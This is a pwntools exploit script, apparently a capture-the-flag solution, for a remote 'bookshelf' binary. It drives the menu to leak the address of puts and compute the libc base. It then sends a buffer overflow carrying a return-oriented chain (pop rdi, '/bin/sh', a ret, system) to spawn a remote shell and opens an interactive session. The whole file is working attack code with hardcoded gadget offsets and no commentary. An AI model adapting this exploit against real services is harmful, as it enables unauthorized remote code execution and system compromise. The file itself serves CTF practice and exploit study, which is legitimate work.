from pwn import *

context.binary = exe = ELF('./bookshelf')
libc = ELF('./libc.so.6')
#context.log_level = 'debug'

io = remote('chal.pctf.competitivecyber.club', 4444)

for _ in range(8):
    io.sendlineafter(b' >> ', b'2')
    io.sendlineafter(b' >> ', b'2')
    io.sendlineafter(b' >> ', b'y')

io.sendlineafter(b' >> ', b'2')
io.sendlineafter(b' >> ', b'3')
io.recvuntil(b'glory 0x')
libc.address = int(io.recvuntil(b' '), 16) - libc.sym['puts']
io.sendlineafter(b' >> ', b'y')

print('Libc base:', hex(libc.address))

io.sendlineafter(b' >> ', b'1')
io.sendlineafter(b' >> ', b'y')
io.sendlineafter(b' >> ', b'i'*38)

io.sendlineafter(b' >> ', b'3')
one = libc.address + 0x50a37
pop_rdi = libc.address + 0x2a3e5
bin_sh = libc.address + 0x1d8698
payload = b'i'*48 + b'\0'*8 + p64(pop_rdi) + p64(bin_sh) + p64(pop_rdi+1) + p64(libc.sym['system'])
io.sendlineafter(b' >> ', payload)


io.interactive()